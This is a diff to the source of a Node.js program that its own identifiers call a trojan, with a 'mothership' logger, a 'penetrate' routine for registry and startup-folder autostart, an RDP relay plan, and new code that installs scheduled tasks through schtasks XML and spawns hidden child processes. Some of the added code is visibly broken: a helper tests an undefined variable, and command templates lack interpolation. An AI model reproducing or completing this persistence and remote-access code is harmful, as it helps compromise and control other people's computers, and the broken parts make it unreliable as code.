@@ -44,23 +44,24 @@ initProcessList()
 
 // --- TESTING LIST ---
 // test vbs, bat, ps1 script job execution (EXEC_VBS, EXEC_BAT, EXEC_PS1 as well as execute_cmdlist method)
+// test bat, ps1, js, py relay
+
 
 // --- TASKS LIST ---
 
 // ! startup: penetrate --> register autostart in registry, folder locations + register tasks // anchor
 // ! startup: reschedule --> obtain 
+// ! node/pyton relay --> make sure we are able to execute RDP on both of these
+// ! read/write/parse/retrieve config
+
+// --- IMPROVEMENTS ---
 
 // ! improve logging / logmsg
 // !! improve mothership logging
 // ! implement exception handling
-// ! modify noderelay to handle browser rdp
-// ! read/write/parse/retrieve config
 
-// ! BUG: execjob script must terminate upon completion --> when finished should 
-// exit process
-
-// ! creating/deleting/query tasks and registry not natively supported by node, have to implement
-// bat/cmd, ps1, vbs failover
+// --- BUGS ---
+// ! execjob script must terminate upon completion --> when finished should exit process
 
 // EXEC_CMD --> GetSystemOverview
 //              GetTrojanDir
@@ -1160,8 +1161,12 @@ function getRandomCode(n) {
 }
 
 function isNullOrWhitespace(str) {
+    if ( ! ( typeof myVariable === 'string') ) // !!!
+        return false;
+
     return !str || !str.trim();
 }
+
 
 function getCallerName() {
     const originalFunc = Error.prepareStackTrace;
@@ -2688,14 +2693,16 @@ function cmdlist() {
 
 // TODO
 function reschedule() {
-    // check if tasks have been scheduled
+    
+    // getTasks
+    // get list of tasks -- compare against configured tasks, if not exist create
+    
 }
 
 // TODO -- missing implementation
 function penetrate() {
     logmsg("starting");
     
-
     // modify registry for startup items
     // copy exe/scripts to startup folders
 
@@ -2730,39 +2737,54 @@ cmdstr = "REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Run
     process.exit(0);
 }
 
+
 async function invoke_exe(
     exename,
     targs = null,
-    exedirpath = systemstate.trojandir,
+    exedirpath = '',//path.dirname(process.argv[1]),
     stdoutfunc,
-    stderrfunc
+    stderrfunc,
+    closefunc,
+    async = false
 ) {
     return new Promise((resolve, reject) => {
-        const exePath = path.join(exedirpath, exename);
+        const exePath = path.join(exedirpath??'', exename);
 
         let child = spawn(exePath, targs, {
             shell: exename.slice(-4) == ".cmd",
             windowsHide: true,
         });
 
+        if ( async )
+            resolve(child);
+
         child.stdout.on("data", (data) => {
-            logmsg(`stdout: ${data.toString()}`);
-            if (stdoutfunc) stdoutfunc(data);
+            let text = data.toString();
+            logmsg(`stdout: ${text}`);
+            if (stdoutfunc) 
+                stdoutfunc(text);
         });
 
         child.stderr.on("data", (data) => {
+            let text = data.toString();
+
             logmsg(`stderr: ${data.toString()}`);
-            if (stderrfunc) stderrfunc(data);
+            if (stderrfunc) stderrfunc(text);
         });
 
         child.on("close", (code) => {
             logmsg(`Child process exited with code ${code}`);
 
-            if (code === 0) {
+            if ( closefunc ) {
+                closefunc(code);
+            }
+
+            if ( code === 0 ) {
                 resolve(child);
             } else {
                 reject(new Error(`Process exited with code ${code}`));
             }
+
         });
 
         child.on("error", (err) => {
@@ -3524,23 +3546,63 @@ function logEventMothership(event_code, kvp) {
 
 // ---
 
-function createTask(taskname) {
-    /*
-    let taskxmlfuncs = {
-        'IdleTask':getIdleTaskXMLStr
-        'RepTask':getRepTaskXMLStr
-        'TimeTask':getTimeTaskXMLStr
-        'DailyTask':getDailyTaskXMLStr
-    };
-    */
+var taskconfig = {
+    get tasknames() {
+        return Object.keys(this.taskxmlfuncs);
+    },
 
-    // generate task xml string
-    // save to xml file
-    // invoke execCreatTask
+    'taskxmlfuncs': {
+        'IdleTask':getIdleTaskXMLStr,
+        'RepTask':getRepTaskXMLStr,
+        'TimeTask':getTimeTaskXMLStr,
+        'DailyTask':getDailyTaskXMLStr
+    },
+
+};
+
+async function getTaskDetail() {
+    // Last Run Time:                        1999-11-30 12:00:00 AM
+    // Last Result:                          267011
+    // schtasks /query /tn "\Microsoft\Windows\NlaSvc\WiFiTask" /fo LIST /v
 }
 
-function execCreatTask() {
+async function getTasks() {
+    let tasknames = [];
+    let taskstr = null;
+    let ret = await invoke_exe( "schtasks", ["/query", "/fo", "LIST"], null,(stdout) => { taskstr += stdout});
+
+
+    if ( isNullOrWhitespace(taskstr) ) {
+        throw new Error('could not generate task names from schtasks');
+    }
+
+    const lines = taskstr.split(/\r?\n/); 
+
+    for ( let i = 0 ; i<lines.length; i++) {
+        let line = lines[i];
+        if ( line.startsWith('TaskName:') ) {
+            let parts = line.split(':');
+            let taskname = parts && parts.length>1 ? parts[1] : '';
+            taskname = taskname.trim();
+            tasknames.push(taskname);
+        }
+    }
+
+    return tasknames;
+}
+
+async function createTask(taskname) {
+
+    let taskxmlstr = taskconfig['taskxmlfuncs'][taskname]();
+    let fpath = path.join(systemstate.trojandir, 'owd_' + taskname + '.xml');
+    fs.writeFileSync(fpath, taskxmlstr, "utf8");
+    await exec_schtasks(fpath, taskname);
+
+}
+
+async function exec_schtasks(taskxmlpath, taskname) {
     // schtasks /create /XML "taskxmlpath" /tn "taskname" /F
+    let ret = await invoke_exe( "schtasks", ["/create", "/XML", `"{taskxmlpath}"`, "/tn", `"{taskname}"`, "/F"]);
 }
 
 function getIdleTaskXMLStr(intaskname, tasktimestr, pexe, args, workdir) {
